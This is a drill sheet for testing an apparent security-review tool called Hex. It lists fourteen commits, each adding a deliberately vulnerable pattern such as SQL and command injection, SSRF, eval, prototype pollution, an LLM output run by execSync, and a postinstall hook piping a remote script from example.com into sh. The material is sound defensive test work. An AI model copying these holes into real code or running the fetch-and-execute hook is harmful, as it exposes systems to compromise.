# Push drills

Each drill is one small commit. Push it, and check that Hex reviews the push and reports the expected finding. Revert or apply the fix drill afterwards so the next drill starts from a clean baseline.

| # | Commit message | Change | Hex should report |
|---|---|---|---|
| 1 | `perf: inline search query` | `src/inventory.js` › `searchProducts`: replace the body with ``return db.prepare(`SELECT sku, name FROM products WHERE name LIKE '%${term}%'`).all();`` | Interpolated SQL (Critical). Fails `security: search input is treated as text` |
| 2 | `feat: invoice archive` | Add to `src/orders.js`: `import { exec } from 'node:child_process';` and ``export function archiveInvoices(customer) { exec('tar -czf invoices-' + customer + '.tgz invoices'); }`` | Command injection (High) |
| 3 | `chore: staging config` | Add `src/config.js` with `export const paymentApiKey = 'pay-staging-7d1e4c9a0b2f';` | Hardcoded secret (High) |
| 4 | `feat: order reference codes` | Add to `src/orders.js`: `export function orderToken() { const token = Math.random().toString(36).slice(2); return token; }` | Weak randomness (Medium) |
| 5 | `feat: pricing rules` | Add to `src/inventory.js`: `export const applyRule = (rule, price) => eval(rule.replace('price', price));` | Dynamic code execution (High) |
| 6 | `feat: allow partner sites` | `npm install cors`, then in `src/server.js` add `import cors from 'cors';` and `app.use(cors());` | Open CORS policy (Medium) |
| 7 | `feat: product image proxy` | In `src/server.js` add ``app.get('/image', async (req, res) => res.send(Buffer.from(await (await fetch(req.query.src)).arrayBuffer())));`` | Server-side request forgery (High) |
| 8 | `feat: saved preferences` | Add `src/prefs.js` with ``export function deepMerge(t, s) { for (const k in s) { t[k] = typeof s[k] === 'object' ? deepMerge(t[k] ?? {}, s[k]) : s[k]; } return t; }`` | Prototype pollution (High), auto-fixed when Docker is available |
| 9 | `feat: return-to after checkout` | In `src/server.js` add ``app.get('/done', (req, res) => res.redirect(req.query.next));`` | Open redirect (Medium) |
| 10 | `chore: add lodash` | Add `"lodash": "4.17.20"` to `dependencies` in `package.json` | Vulnerable dependency (CVE-2021-23337) |
| 11 | `chore: setup hook` | Add `"postinstall": "curl -s https://example.com/setup.sh \| sh"` to `scripts` | Suspicious install script (High). Supply-chain worm pattern |
| 12 | `ci: harden runner` | In `.github/workflows/ci.yml`, add a first step `- uses: step-security/harden-runner@v2` | Third-party action not pinned (Medium) |
| 13 | `ci: log commit` | In `.github/workflows/ci.yml`, add a step `- run: echo "${{ github.event.head_commit.message }}"` | Workflow script injection (High) |
| 14 | `feat: AI order helper` | Add `src/assistant.js` that imports `openai`, builds `{ role: 'system', content: 'Help ' + req.body.customer }` and passes `completion.choices[0].message.content` to `execSync` | User input in system prompt (High), LLM output executed as code (Critical) |
| — | `fix: revert drill` | `git revert HEAD` | No new findings; baseline tests pass |

Already present on purpose, to check the auto-fix path: Express still sends the `x-powered-by` header, which Hex patches automatically.
